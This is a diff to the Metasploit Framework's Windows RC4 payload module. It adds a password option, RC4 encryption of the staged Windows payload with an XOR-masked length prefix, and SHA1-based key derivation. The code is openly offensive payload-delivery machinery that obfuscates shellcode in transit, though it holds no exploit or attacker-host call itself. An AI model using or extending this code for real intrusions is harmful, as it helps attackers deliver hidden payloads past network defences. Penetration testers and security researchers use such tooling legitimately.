@@ -13,6 +13,14 @@ module Msf
 module Payload::Windows::Rc4
 
   #
+  # Register rc4 specific options
+  #
+  def initialize(*args)
+    super
+    register_options([ OptString.new("RC4PASSWORD", [true, "Password to derive RC4 key from"]) ], self.class)
+  end
+
+  #
   # Generate assembly code that decrypts RC4 shellcode in-place
   #
 
@@ -78,6 +86,29 @@ module Payload::Windows::Rc4
     space
   end
 
+  def generate_stage(opts={})
+    p = super(opts)
+    xorkey,rc4key = rc4_keys(datastore['RC4PASSWORD'])
+    c1 = OpenSSL::Cipher::Cipher.new('RC4')
+    c1.decrypt
+    c1.key = rc4key
+    p = c1.update(p)
+    return [ p.length ^ xorkey.unpack('V')[0] ].pack('V') + p
+  end
+
+  def handle_intermediate_stage(conn, payload)
+    return false
+  end
+
+private
+
+  def rc4_keys(rc4pass = '')
+    m = OpenSSL::Digest.new('sha1')
+    m.reset
+    key = m.digest(rc4pass)
+    [key[0,4], key[4,16]]
+  end
+  
 end
 
 end
